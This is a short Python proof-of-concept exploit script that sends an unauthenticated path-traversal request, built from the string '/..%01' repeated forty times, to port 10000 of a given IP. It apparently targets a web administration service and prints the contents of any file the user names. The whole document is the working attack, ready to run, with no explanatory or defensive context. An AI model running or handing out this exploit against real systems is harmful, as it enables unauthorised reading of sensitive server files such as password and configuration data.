import requests
import sys

if(len(sys.argv) != 3):
    print("[USAGE] python %s TARGET_IP FILE" % sys.argv[0])
    sys.exit(0)

print("Starting request")
print("Requesting %s from %s" % (sys.argv[1], sys.argv[2]))
rs = requests.get("http://%s:10000/unauthenticated/" % (sys.argv[1],)  + "/..%01" * 40 + sys.argv[2])
print(rs.content)